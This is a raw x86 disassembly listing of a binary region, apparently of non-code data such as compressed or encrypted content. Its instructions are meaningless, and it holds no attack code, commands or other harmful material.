  422709:	cmp    BYTE PTR [edx+edi*4-0x3d],dh
  42270d:	add    DWORD PTR [edx],esi
  42270f:	mov    WORD PTR [edx+0x0],ds
	...
  422772:	add    BYTE PTR [eax],al
  422774:	daa    
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0xe97f01c8
  422781:	mov    edi,0x6fe33289
  422786:	add    DWORD PTR [eax],eax
  422788:	add    eax,0xce000001
  42278d:	xor    eax,0x4b4141f9
  422792:	dec    esi
  422793:	jmp    0x508dd84
  422798:	sub    edx,ebx
  42279a:	fcomp  QWORD PTR [esi+0x70]
  42279d:	iret   
  42279e:	jae    0x422810
  4227a0:	bound  ecx,QWORD PTR [ebx-0x146bc1f2]
  4227a6:	jge    0x422743
  4227a8:	push   edx
  4227a9:	aam    0x45
  4227ab:	jle    0x42279d
  4227ad:	out    0x13,eax
  4227af:	add    DWORD PTR [esi+0x5463bf06],0x49404b62
  4227b9:	adc    BYTE PTR [ebp+0x33],ah
  4227bc:	sbb    eax,0x75386fb4
  4227c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227c2:	ja     0x4227b0
  4227c4:	ror    DWORD PTR [eax-0x3ab060d4],1
  4227ca:	mov    al,ds:0x68c0da41
  4227cf:	xor    al,0x75
  4227d1:	pop    edi
  4227d2:	push   es
  4227d3:	(bad)  
  4227d4:	leave  
  4227d5:	popa   
  4227d6:	xor    bh,dh
  4227d8:	out    0x8f,eax
  4227da:	xchg   esp,eax
  4227db:	push   cs
  4227dc:	sub    BYTE PTR [esi+0x5e40970],dh
  4227e2:	rcl    DWORD PTR [eax+0x11],cl
  4227e5:	fmul   QWORD PTR [esi]
  4227e7:	inc    ebx
  4227e8:	sbb    DWORD PTR [ecx+0x66bf82a5],edi
  4227ee:	push   eax
  4227ef:	dec    eax
  4227f0:	dec    ecx
  4227f1:	cmp    DWORD PTR [esi+edi*2-0x136519a7],esp
  4227f8:	ja     0x42280f
  4227fa:	pushf  
  4227fb:	mul    bl
  4227fd:	xlat   BYTE PTR ds:[ebx]
  4227fe:	mov    WORD PTR [esi],gs
  422800:	sub    dl,bl
  422802:	test   BYTE PTR [esp+ecx*1-0x50],0x3d
  422807:	cmp    edi,DWORD PTR [esi]
  422809:	mov    ds:0xc0ed994,al
  42280e:	mov    DWORD PTR [ebx-0x17],ebp
  422811:	or     al,0xbd
  422813:	mov    eax,ds:0x315eb26f
  422818:	dec    ebp
  422819:	test   ch,bl
  42281b:	in     eax,dx
  42281c:	xor    BYTE PTR [edx-0x75],dh
  42281f:	in     eax,0xd8
  422821:	mov    ebp,0xb137b331
  422826:	sub    ebx,DWORD PTR [edi]
  422828:	jnp    0x4227f1
  42282a:	rcr    edi,cl
  42282c:	xchg   ebp,eax
  42282d:	scas   al,BYTE PTR es:[edi]
  42282e:	sub    BYTE PTR [edx+ebp*2+0x58],dh
  422832:	mov    cl,0xe
  422834:	mov    ebx,ebx
  422836:	sar    BYTE PTR [edi],0x9c
  422839:	in     eax,dx
  42283a:	pop    ebp
  42283b:	push   cs
  42283c:	out    0x67,eax
  42283e:	ins    BYTE PTR es:[edi],dx
  42283f:	mov    al,ds:0xe4875e20
  422844:	iret   
  422845:	xor    cl,BYTE PTR ds:0xba0c15e4
  42284b:	mov    ebx,DWORD PTR [ebp-0x44788082]
  422851:	mov    eax,ds:0xb582240f
  422856:	sub    edi,DWORD PTR [esi]
  422858:	push   ecx
  422859:	mov    bh,0x13
  42285b:	mov    ch,0xbd
  42285d:	fisttp DWORD PTR [edx-0x5f55c37a]
  422863:	jo     0x422874
  422865:	stos   DWORD PTR es:[edi],eax
  422866:	pop    eax
  422867:	mov    ebp,0x649503dd
  42286c:	popa   
  42286d:	call   FWORD PTR [esi]
  42286f:	jne    0x422895
  422871:	inc    BYTE PTR [ecx-0x4c]
  422874:	xchg   DWORD PTR [edi+0xde9df26],esi
  42287a:	pop    es
  42287b:	out    dx,al
  42287c:	xor    edx,ebp
  42287e:	sbb    DWORD PTR [edx+ebx*4],esi
  422881:	sub    esi,DWORD PTR [esi+0x55b15078]
  422887:	pop    es
  422888:	mov    ah,0x69
  42288a:	pop    esi
  42288b:	and    al,0x35
  42288d:	add    esi,DWORD PTR [ecx]
  42288f:	int    0xf0
	...
  4228f1:	add    BYTE PTR [eax],al
  4228f3:	add    ch,cl
  4228f5:	cmp    DWORD PTR [eax-0x10680369],edi
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x42291e
  422901:	ret    
  422902:	push   ebx
  422903:	mov    ebp,0x170e8
  422908:	add    eax,0xc4000001
  42290d:	and    DWORD PTR [ebx-0x19b1a33],esp
  422913:	adc    DWORD PTR [eax],edi
  422915:	push   ebp
  422916:	pop    ebx
  422917:	fcmovne st,st(4)
  422919:	clc    
  42291a:	pop    ecx
  42291b:	arpl   WORD PTR [ebx+0x1e],bx
  42291e:	xchg   DWORD PTR [eax-0x24],esi
  422921:	mov    al,ds:0x38719c75
  422926:	arpl   WORD PTR [edi+ebp*4-0x4b57523f],dx
  42292d:	mov    edx,DWORD PTR [eax]
  42292f:	hlt    
  422930:	(bad)  
  422931:	mov    ebp,0x650258b0
  422936:	arpl   WORD PTR [eax+0x7bd331a8],ax
  42293c:	mov    ah,0x1e
  42293e:	cli    
  42293f:	add    BYTE PTR [edx],dl
  422941:	js     0xea9d1c76
  422947:	mov    ah,0x56
  422949:	mov    ebp,0x4d2ad10d
  42294e:	js     0x422914
  422950:	cli    
  422951:	xor    al,0xd8
  422953:	push   cs
  422954:	inc    edi
  422955:	jecxz  0x422940
  422957:	jl     0x4228df
  422959:	arpl   WORD PTR [esi+0x784bf9ab],dx
  42295f:	std    
  422960:	fild   WORD PTR [esi+edx*8-0x422bb5e6]
  422967:	inc    ecx
  422968:	mov    sp,si
  42296b:	in     eax,dx
  42296c:	fild   QWORD PTR [edx-0x7a0e0d58]
  422972:	jecxz  0x422942
  422974:	mov    ds:0xa352cf97,al
  422979:	popf   
  42297a:	mov    dl,BYTE PTR [ebx+0x40]
  42297d:	xor    DWORD PTR [ebx+esi*8-0x3],eax
  422981:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422982:	mov    edx,0xc84ee744
  422987:	repnz repnz stos DWORD PTR es:[edi],eax
  42298a:	mov    edx,0x6662ca8f
  42298f:	and    edx,0xffffffdf
  422992:	arpl   WORD PTR [edi*2-0x393bc37e],sp
  422999:	data16 xor al,0x24
  42299c:	mov    esi,esi
  42299e:	(bad)  
  42299f:	push   esi
  4229a0:	ret    0x35
  4229a3:	aam    0x2a
  4229a5:	xchg   BYTE PTR ds:0xe79484bc,al
  4229ab:	lahf   
  4229ac:	mov    ds:0x2509593a,al
  4229b1:	pop    edx
  4229b2:	pop    ebx
  4229b3:	iret   
  4229b4:	out    0x57,al
  4229b6:	sub    BYTE PTR ds:0xcd09fc4,dh
  4229bc:	test   dl,ch
  4229be:	pusha  
  4229bf:	bt     DWORD PTR [edi],edi
  4229c2:	div    BYTE PTR [edx-0x2]
  4229c5:	aam    0x9b
  4229c7:	jecxz  0x422982
  4229c9:	dec    esi
  4229ca:	retf   
  4229cb:	div    bh
  4229cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229ce:	bnd ret 0x795b
  4229d2:	fwait
  4229d3:	or     BYTE PTR ds:0x205ab881,0x24
  4229da:	nop
  4229db:	repnz or al,0x6d
  4229de:	fs pop eax
  4229e0:	pusha  
  4229e1:	pop    ss
  4229e2:	xchg   esi,eax
  4229e3:	fadd   st(4),st
  4229e5:	pop    ds
  4229e6:	lds    esi,FWORD PTR [esi-0x3c]
  4229e9:	(bad)  
  4229eb:	fucom  st(7)
  4229ed:	sub    dh,ch
  4229ef:	outs   dx,DWORD PTR ds:[esi]
  4229f0:	(bad)
  4229f4:	add    bh,dl
  4229f6:	pop    edi
  4229f7:	popf   
  4229f8:	and    BYTE PTR [edi+ebx*4-0xe],0x1e
  4229fd:	int3   
  4229fe:	mov    ch,0xe8
  422a00:	into   
  422a01:	daa    
  422a02:	adc    al,0xfb
  422a04:	cli    
  422a05:	icebp  
  422a06:	push   edx
  422a07:	addr16 xor ch,ah
  422a0a:	mov    BYTE PTR [eax+0x7eedf8c],cl
  422a10:	xor    al,0x0
	...
  422a72:	add    BYTE PTR [eax],al
  422a74:	xchg   esi,eax
  422a75:	push   0x18
  422a77:	mov    ah,bh
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	cwde   
  422a81:	jp     0x422a11
  422a83:	sbb    eax,0x171ed
  422a88:	add    eax,0xee000001
  422a8d:	out    0x23,eax
  422a8f:	stc    
  422a90:	xchg   ebx,eax
  422a91:	aaa    
  422a92:	bound  edi,QWORD PTR [eax]
  422a94:	scas   eax,DWORD PTR es:[edi]
  422a95:	in     eax,0xae
  422a97:	shr    dh,1
  422a99:	xchg   esp,eax
  422a9a:	std    
  422a9b:	cwde   
  422a9c:	outs   dx,DWORD PTR ds:[esi]
  422a9d:	push   ebp
  422a9e:	test   eax,0x8ade1086
  422aa3:	xchg   ebx,eax
  422aa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422aa5:	shl    ebp,1
  422aa7:	faddp  st(6),st
  422aa9:	loope  0x422a6d
  422aab:	shr    DWORD PTR [ebp-0x6e],cl
  422aae:	clc    
  422aaf:	cmp    BYTE PTR [ebp+0x465d8669],al
  422ab5:	sbb    eax,0x86bd05de
  422aba:	in     al,dx
  422abb:	jns    0x422ac9
  422abd:	(bad)  
  422abe:	jmp    0x485aa34e
  422ac3:	add    esp,DWORD PTR [ecx+0x67bc2c19]
  422ac9:	sbb    BYTE PTR ds:0xd0c0c71f,ch
  422acf:	fwait
  422ad0:	jg     0x422adc
  422ad2:	repz xchg ecx,eax
  422ad4:	mov    ecx,DWORD PTR [esi]
  422ad6:	cmp    ebp,DWORD PTR [esi]
  422ad8:	(bad)  
  422ad9:	push   edi
  422ada:	sub    dl,BYTE PTR [eax+edx*4-0x55da055f]
  422ae1:	or     al,0xf0
  422ae3:	loopne 0x422aa3
  422ae5:	push   esi
  422ae6:	mov    esi,0x6099eb37
  422aeb:	push   esi
  422aec:	loopne 0x422b3a
  422aee:	icebp  
  422aef:	in     eax,dx
  422af0:	outs   dx,BYTE PTR ds:[esi]
  422af1:	push   ebp
  422af2:	pop    ebp
  422af3:	hlt    
  422af4:	mov    WORD PTR [edx-0x4283cb12],cs
  422afa:	xchg   esi,eax
  422afb:	adc    al,0x12
  422afd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422afe:	xchg   ecx,eax
  422aff:	jecxz  0x422b7f
  422b01:	lods   eax,DWORD PTR ds:[esi]
  422b02:	pop    esi
  422b03:	or     edi,DWORD PTR [eax+0x59f4cfdf]
  422b09:	or     eax,0x8f342743
  422b0e:	ror    DWORD PTR [eax-0x6632a1f0],0xd9
  422b15:	add    al,0x82
  422b17:	or     bh,BYTE PTR [edx]
  422b19:	aas    
  422b1a:	jno    0x422b7f
  422b1c:	pop    ds
  422b1d:	(bad)  
  422b1e:	mov    edi,0x35375033
  422b23:	inc    ebp
  422b24:	ror    BYTE PTR [ecx+ecx*4+0x5a],0xa6
  422b29:	pop    esi
  422b2a:	or     dl,ch
  422b2c:	push   eax
  422b2d:	sbb    DWORD PTR [edi],0x229d48f1
  422b33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b34:	or     dl,BYTE PTR [ebp+0x19]
  422b37:	fisttp DWORD PTR [edx]
  422b39:	retf   
  422b3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b3b:	sub    al,BYTE PTR [ebp+0x63]
  422b3e:	sub    BYTE PTR [esi-0x177cb6d6],bl
  422b44:	push   0xffffffc0
  422b46:	or     bh,BYTE PTR [ebx-0x31599b70]
  422b4c:	adc    cl,BYTE PTR [eax-0x6460e40]
  422b52:	nop
  422b53:	mov    ch,0x11
  422b55:	cmp    bl,dl
  422b57:	jl     0x422bd0
  422b59:	jb     0x422b77
  422b5b:	ds in  al,dx
  422b5d:	jle    0x422b02
  422b5f:	retf   0x1683
  422b62:	push   esp
  422b63:	hlt    
  422b64:	pop    ss
  422b65:	loop   0x422b04
  422b67:	imul   ebx,DWORD PTR [edi],0xe40601df
  422b6d:	jg     0x422afe
  422b6f:	xchg   BYTE PTR [edi],dl
  422b71:	dec    eax
  422b72:	sub    BYTE PTR [esi],ah
  422b74:	sub    al,0xe8
  422b76:	test   DWORD PTR ss:[edx+eax*2-0x541667fb],ecx
  422b7e:	fidivr DWORD PTR [eax+0x16]
  422b81:	test   DWORD PTR [ebp+0x10],ebp
  422b84:	das    
  422b85:	ds mov ch,0x2d
  422b88:	mov    bl,0xbf
  422b8a:	cdq    
  422b8b:	ja     0x422b76
  422b8d:	mov    ds:0x183419,eax
	...
  422bf2:	add    BYTE PTR [eax],al
  422bf4:	inc    esp
  422bf5:	aaa    
  422bf6:	dec    edx
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx-0x157b264]
  422c02:	cmp    BYTE PTR [esi-0xe],ch
  422c05:	jb     0x422c08
  422c07:	add    BYTE PTR ds:0xdb000001,al
  422c0d:	mov    eax,ebp
  422c0f:	mov    bl,0x2a
  422c11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c12:	rcr    BYTE PTR [eax+edx*2+0x6b3022c5],1
  422c19:	xor    al,0x15
  422c1b:	and    al,0xc2
  422c1d:	xor    eax,DWORD PTR [eax-0x6a07c6c6]
  422c23:	sbb    DWORD PTR [edx-0x59a0dc5f],esi
  422c29:	mov    esp,DWORD PTR [ebx]
  422c2b:	test   al,0xe3
  422c2d:	mov    al,ds:0xc9517901
  422c32:	mov    esi,DWORD PTR [eax]
  422c34:	inc    esi
  422c35:	add    bh,bh
  422c37:	mov    ecx,0xfad73bfe
  422c3c:	xor    bl,dh
  422c3e:	test   BYTE PTR [edi],bh
  422c40:	dec    ebx
  422c41:	rcl    BYTE PTR [edi-0x66],0x61
  422c45:	pop    es
  422c46:	fsub   st,st(3)
  422c48:	sti    
  422c49:	outs   dx,DWORD PTR ds:[esi]
  422c4a:	cmp    BYTE PTR [edx],bh
  422c4c:	ja     0x422be5
  422c4e:	retf   
  422c4f:	adc    dh,BYTE PTR [esi]
  422c51:	test   DWORD PTR [esi],0x265a3e81
  422c57:	inc    ebp
  422c58:	mov    bl,0x97
  422c5a:	dec    eax
  422c5b:	xor    edx,DWORD PTR ss:[ebp-0x720f921d]
  422c62:	adc    al,0x99
  422c64:	and    BYTE PTR [ebp-0x1ad8161a],dl
  422c6a:	repnz sub DWORD PTR [ecx-0x3d],ebp
  422c6e:	enter  0x9bd0,0x8c
  422c72:	mov    dh,0xd6
  422c74:	jae    0x422c40
  422c76:	pop    eax
  422c77:	mov    bl,0x14
  422c79:	mov    esp,0x5d84e8d5
  422c7e:	push   edi
  422c7f:	pushf  
  422c80:	enter  0x6e04,0x87
  422c84:	sbb    DWORD PTR [ebx-0x2c],ecx
  422c87:	push   0xb70b9e5f
  422c8c:	xchg   DWORD PTR [ebx+esi*2-0x7],ecx
  422c90:	test   DWORD PTR [esi-0x60],eax
  422c93:	into   
  422c94:	lahf   
  422c95:	jle    0x422c1c
  422c97:	sbb    DWORD PTR [esi],esp
  422c99:	push   ss
  422c9a:	mov    cl,0x1e
  422c9c:	aaa    
  422c9d:	and    DWORD PTR [edx+ebp*4+0x78],0xffffffcc
  422ca2:	dec    ecx
  422ca3:	xor    esp,DWORD PTR [edi+0x54a7fc95]
  422ca9:	or     ecx,ebx
  422cab:	stc    
  422cac:	pop    ecx
  422cad:	cs mov gs,edx
  422cb0:	jne    0x422c9a
  422cb2:	pop    edi
  422cb3:	sahf   
  422cb4:	cs ds jp 0x422ce8
  422cb8:	sbb    esi,edx
  422cba:	popa   
  422cbb:	retf   
  422cbc:	aaa    
  422cbd:	cs mov al,0x50
  422cc0:	inc    edx
  422cc1:	repz mov esp,0x3015f722
  422cc7:	jno    0x422d2e
  422cc9:	std    
  422cca:	xchg   ecx,eax
  422ccb:	mov    ds:0x3feea804,eax
  422cd0:	leave  
  422cd1:	dec    ebx
  422cd2:	cli    
  422cd3:	sub    dl,BYTE PTR [edi]
  422cd5:	icebp  
  422cd6:	jge    0x422c6c
  422cd8:	inc    esp
  422cd9:	xor    ebp,DWORD PTR [ecx+0x78a1fabd]
  422cdf:	into   
  422ce0:	pop    eax
  422ce1:	test   al,0x28
  422ce3:	cmp    esi,ebp
  422ce5:	push   cs
  422ce6:	inc    ebp
  422ce7:	cli    
  422ce8:	and    dh,BYTE PTR [ecx+edi*1]
  422ceb:	retf   0x511e
  422cee:	pop    ebp
  422cef:	ja     0x422c7d
  422cf1:	mov    eax,0x7e3e5689
  422cf6:	mov    esp,0xc024f8d1
  422cfb:	mov    esi,0x4e16d7d9
  422d00:	outs   dx,BYTE PTR ds:[esi]
  422d01:	adc    dl,BYTE PTR [edi]
  422d03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d04:	jbe    0x422d21
  422d06:	add    DWORD PTR [ebx+0x79],ecx
  422d09:	pushf  
  422d0a:	and    al,cl
  422d0c:	cdq    
  422d0d:	push   ss
  422d0e:	fimul  WORD PTR [eax-0x6a]
	...
  422d71:	add    BYTE PTR [eax],al
  422d73:	add    BYTE PTR [edi+0x626d60bd],bh
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    ebx,DWORD PTR [eax+ebp*4+0x73f7ed66]
  422d86:	add    DWORD PTR [eax],eax
  422d88:	add    eax,0x93000001
  422d8d:	popa   
  422d8e:	sub    al,0x8d
  422d90:	(bad)  
  422d92:	sub    eax,0x87b44610
  422d97:	idiv   DWORD PTR [ebx]
  422d99:	sahf   
  422d9a:	inc    ebp
  422d9b:	mov    ch,0x5e
  422d9d:	hlt    
  422d9e:	push   es
  422d9f:	ins    BYTE PTR es:[edi],dx
  422da0:	push   ecx
  422da1:	adc    al,0x30
  422da3:	not    BYTE PTR [edi-0xf887ee5]
  422da9:	mov    dl,0x19
  422dab:	stos   DWORD PTR es:[edi],eax
  422dac:	mov    BYTE PTR [ebp+0x6ed7f963],ch
  422db2:	rol    BYTE PTR [ecx],1
  422db4:	fwait
  422db5:	leave  
  422db6:	sti    
  422db7:	cmp    ah,0xd1
  422dba:	mov    bh,0xde
  422dbc:	xor    al,0xef
  422dbf:	add    ah,bl
  422dc1:	out    0x93,al
  422dc3:	pop    es
  422dc4:	jle    0x422e1d
  422dc6:	nop
  422dc7:	jmp    0xb53c:0xcfa64177
  422dce:	pop    edi
  422dcf:	sbb    DWORD PTR [ebx],esp
  422dd1:	xchg   esp,eax
  422dd2:	jmp    0x8ae4119f
  422dd7:	inc    edx
  422dd8:	mov    dl,0x24
  422dda:	adc    DWORD PTR [ecx+0x24871459],edx
  422de0:	push   edi
  422de1:	adc    DWORD PTR [esi+0x73],eax
  422de4:	mov    ds:0x43a0ddf2,al
  422de9:	xor    DWORD PTR ds:0x52372e96,ebx
  422df0:	arpl   WORD PTR [ebx+0x431ee6b8],bx
  422df6:	cmp    DWORD PTR [edx+0x22188cb9],esi
  422dfc:	in     al,0x5e
  422dfe:	aas    
  422dff:	pop    edx
  422e00:	mov    cl,0x72
  422e02:	fwait
  422e03:	rol    bl,cl
  422e05:	pop    ecx
  422e06:	mov    eax,0x9f16217
  422e0b:	test   DWORD PTR [ecx+0x10d81c8b],ecx
  422e11:	lds    ebx,FWORD PTR ds:0x48eb34ad
  422e17:	stc    
  422e18:	(bad)  
  422e19:	xchg   esi,eax
  422e1a:	outs   dx,DWORD PTR ds:[esi]
  422e1b:	jecxz  0x422dc3
  422e1d:	in     al,0x43
  422e1f:	or     cl,0xb
  422e22:	inc    esp
  422e23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e24:	cmp    dl,BYTE PTR [edi+ebx*1+0x464764f0]
  422e2b:	pop    ebx
  422e2c:	inc    esp
  422e2d:	mov    bl,0x71
  422e2f:	in     eax,0xd2
  422e31:	or     ebp,DWORD PTR [edi-0x33]
  422e34:	cmp    DWORD PTR [edi-0x3e],ecx
  422e37:	inc    edi
  422e38:	(bad)  
  422e39:	or     ax,0x942e
  422e3d:	jne    0x422e0a
  422e3f:	cmp    edx,DWORD PTR [ecx+eax*2-0x70bb48f7]
  422e46:	test   eax,0xa20c3c08
  422e4b:	sub    al,0x99
  422e4d:	sahf   
  422e4e:	fimul  WORD PTR [ebx]
  422e50:	cmp    al,0x6f
  422e52:	ficom  DWORD PTR [ecx-0xec3818b]
  422e58:	mov    al,0x98
  422e5a:	jmp    0x422e43
  422e5c:	call   0x37de:0xdff6d5cf
  422e63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e64:	sub    edi,edx
  422e66:	xor    al,0xc5
  422e68:	ror    BYTE PTR [edi+0x78],0x60
  422e6c:	sahf   
  422e6d:	push   esp
  422e6e:	fwait
  422e6f:	das    
  422e70:	adc    ch,ah
  422e72:	maskmovq mm6,mm6
  422e75:	cmc    
  422e76:	adc    BYTE PTR [ecx],al
  422e78:	inc    ebp
  422e79:	or     edx,esp
  422e7b:	mov    edi,DWORD PTR [ebx+0x37]
  422e7e:	push   edi
  422e7f:	loopne 0x422e12
  422e81:	pop    esp
  422e82:	js     0x422e34
  422e84:	lahf   
  422e85:	call   0xa4d4:0xe783e39d
  422e8c:	sbb    ebx,0xe7f55
	...
  422ef2:	add    BYTE PTR [eax],al
  422ef4:	adc    DWORD PTR [ebp-0x78],0x19
  422ef8:	(bad)  
  422efa:	xchg   ebx,eax
  422efb:	fisttp WORD PTR [eax]
  422efd:	mov    eax,0x5637ca33
  422f02:	dec    ebp
  422f03:	push   ebp
  422f04:	cld    
  422f05:	je     0x422f08
  422f07:	add    BYTE PTR ds:0xb5000001,al
  422f0d:	mov    eax,ds:0x62fa0647
  422f12:	lahf   
  422f13:	aam    0xd5
  422f15:	in     al,dx
  422f16:	sbb    al,0x48
  422f18:	(bad)  
  422f19:	adc    BYTE PTR [ebx+0x47],bl
  422f1c:	lahf   
  422f1d:	jecxz  0x422f8f
  422f1f:	nop
  422f20:	jb     0x422f0a
  422f22:	popa   
  422f23:	iret   
  422f24:	aas    
  422f25:	jb     0x422f02
  422f27:	cmp    BYTE PTR [ecx+0x50],ch
  422f2a:	repz push eax
  422f2c:	mov    ebp,0xca70e46a
  422f31:	div    dl
  422f33:	cmc    
  422f34:	mov    ah,0x3b
  422f36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f37:	push   0x5d
  422f39:	dec    esi
  422f3a:	xchg   edx,eax
  422f3b:	jp     0x422ee2
  422f3d:	(bad)  
  422f3e:	mov    bl,0x42
  422f40:	inc    eax
  422f41:	mov    dl,0x17
  422f43:	pusha  
  422f44:	and    BYTE PTR [ecx],dh
  422f46:	arpl   WORD PTR [eax],si
  422f48:	mov    al,0xfb
  422f4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f4b:	mov    al,0x4c
  422f4d:	cmc    
  422f4e:	push   ebx
  422f4f:	aam    0x8a
  422f51:	pop    ebx
  422f52:	lock mov WORD PTR [edx-0x18],cs
  422f56:	xchg   DWORD PTR ds:0x1173a603,esp
  422f5c:	lahf   
  422f5d:	repnz and eax,0x7feed012
  422f63:	xchg   ecx,eax
  422f64:	(bad)  
  422f65:	pop    ecx
  422f66:	jae    0x422fc2
  422f68:	sub    al,0xbc
  422f6a:	inc    eax
  422f6b:	sub    DWORD PTR [ebp-0x2b],esp
  422f6e:	ret    
  422f6f:	div    cl
  422f71:	push   esi
  422f72:	mov    BYTE PTR [edi+0x5],dh
  422f75:	xchg   esi,eax
  422f76:	cwde   
  422f77:	leave  
  422f78:	idiv   BYTE PTR [ebx+edx*2-0x43]
  422f7c:	or     ecx,DWORD PTR [ecx]
  422f7e:	mov    bl,0x59
  422f80:	lock loopne 0x422f30
  422f83:	adc    ecx,DWORD PTR [ebp-0x49]
  422f86:	fs loop 0x422ff1
  422f89:	xchg   esp,eax
  422f8a:	(bad)  
  422f8b:	outs   dx,DWORD PTR ds:[esi]
  422f8c:	das    
  422f8d:	test   DWORD PTR [edi+0x2ae2e0c7],ebx
  422f93:	or     DWORD PTR [ebx-0x51],esi
  422f96:	pop    eax
  422f97:	inc    edx
  422f98:	xchg   edx,eax
  422f99:	mov    eax,0xe8b62fa6
  422f9e:	xor    DWORD PTR [ebx+0x28],ecx
  422fa1:	in     eax,dx
  422fa2:	adc    ebx,DWORD PTR [eax+0x56ffaae8]
  422fa8:	xchg   esp,eax
  422fa9:	xor    BYTE PTR [edx],0xe3
  422fac:	inc    esp
  422fad:	mov    BYTE PTR [ebx-0x6e9bed19],dh
  422fb3:	lds    esi,FWORD PTR [esi-0x3a078206]
  422fb9:	jmp    FWORD PTR [edx+0x18]
  422fbc:	dec    edx
  422fbd:	dec    esi
  422fbe:	add    cl,BYTE PTR [edx-0x3d5ffa09]
  422fc4:	xchg   ebp,eax
  422fc5:	mov    eax,0xe0f7480
  422fca:	aam    0x4a
  422fcc:	icebp  
  422fcd:	xor    al,0x93
  422fcf:	xor    BYTE PTR [ebx-0x2],ch
  422fd2:	lock in eax,0x3e
  422fd5:	lods   eax,DWORD PTR ds:[esi]
  422fd6:	stos   DWORD PTR es:[edi],eax
  422fd7:	jne    0x422f78
  422fd9:	out    0x87,eax
  422fdb:	adc    bh,BYTE PTR ds:0xcbc0201a
  422fe1:	mov    eax,0x71565302
  422fe6:	ret    
  422fe7:	xor    DWORD PTR [eax],0x4819ab20
  422fed:	(bad)  
  422fee:	jmp    0x422f93
  422ff0:	xchg   ecx,eax
  422ff1:	jmp    0x34786b6f
  422ff6:	push   ss
  422ff7:	dec    eax
  422ff8:	imul   edx,ecx,0x74
  422ffb:	adc    ch,ch
  422ffd:	pop    edi
  422ffe:	mov    ah,0x5f
  423000:	(bad)  
  423001:	mov    ds:0xcbf5763b,al
  423006:	mov    ch,0x55
  423008:	enter  0x4794,0x1a
  42300c:	or     esp,esp
  42300e:	xor    edx,DWORD PTR [ecx]
  423010:	std    
	...
  423071:	add    BYTE PTR [eax],al
  423073:	add    BYTE PTR [esi-0x1c],al
  423076:	bound  ecx,QWORD PTR [eax-0x1111711e]
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [ebp+edx*4+0x19013d9],esp
  423085:	jbe    0x423088
  423087:	add    BYTE PTR ds:0x82000001,al
  42308d:	mov    WORD PTR [ebx],es
  42308f:	shl    dh,1
  423091:	outs   dx,DWORD PTR ds:[esi]
  423092:	mov    BYTE PTR [eax-0x160c330e],ch
  423098:	cmp    cl,BYTE PTR [ebp+eax*8-0x63]
  42309c:	pop    es
  42309d:	into   
  42309e:	xchg   edi,eax
  42309f:	ret    0xcfab
  4230a2:	stc    
  4230a3:	sahf   
  4230a4:	or     al,0xfc
  4230a6:	or     BYTE PTR [ecx],ah
  4230a8:	gs int 0xe1
  4230ab:	ret    
  4230ac:	mov    bl,0xd5
  4230ae:	ins    BYTE PTR es:[edi],dx
  4230af:	pop    ss
  4230b0:	imul   esi,DWORD PTR [esi-0x17],0x34
  4230b4:	(bad)  
  4230b5:	dec    esp
  4230b6:	sbb    BYTE PTR [eax-0x35],ch
  4230b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230ba:	repnz test DWORD PTR [ecx-0x40],eax
  4230be:	lahf   
  4230bf:	daa    
  4230c0:	or     edx,esp
  4230c2:	xor    eax,0x5b462fd9
  4230c7:	cmp    al,BYTE PTR [ebx+0x4c]
  4230ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230cb:	stos   DWORD PTR es:[edi],eax
  4230cc:	ror    ecx,0x89
  4230cf:	popa   
  4230d0:	or     bh,BYTE PTR [ecx-0x7523901d]
  4230d6:	(bad)  
  4230d7:	adc    bh,BYTE PTR [ebx+0x2f]
  4230da:	addr16 push 0xcd153c2f
  4230e0:	sub    BYTE PTR [edx-0x47],dl
  4230e3:	aam    0x41
  4230e5:	retf   0x394b
  4230e8:	gs out 0x81,al
  4230eb:	jle    0x42306e
  4230ed:	cdq    
  4230ee:	xor    eax,DWORD PTR [esi]
  4230f0:	(bad)  
  4230f1:	xchg   ebx,eax
  4230f2:	mov    BYTE PTR [ebp-0x42b97949],ch
  4230f8:	in     al,0x8e
  4230fa:	cmp    BYTE PTR [ebx],0xbc
  4230fd:	jae    0x42311b
  4230ff:	stos   DWORD PTR es:[edi],eax
  423100:	gs scas al,BYTE PTR es:[edi]
  423102:	scas   eax,DWORD PTR es:[edi]
  423103:	push   cs
  423104:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423105:	add    al,0x7
  423107:	imul   ecx,DWORD PTR [edi-0x1],0xb75c935f
  42310e:	jae    0x423182
  423110:	cmp    BYTE PTR [ebx-0x1e],0x66
  423114:	dec    esp
  423115:	xlat   BYTE PTR ds:[ebx]
  423116:	xlat   BYTE PTR ds:[ebx]
  423117:	mov    ebx,0x83308255
  42311c:	jb     0x423129
  42311e:	dec    ebp
  423120:	sub    dh,BYTE PTR [edi+0x3b]
  423123:	add    esp,edi
  423125:	jno    0x42312e
  423127:	addr16 add esi,0xffffffe7
  42312b:	mov    ah,0x87
  42312d:	pop    ss
  42312e:	or     DWORD PTR [edx],edx
  423130:	jl     0x423194
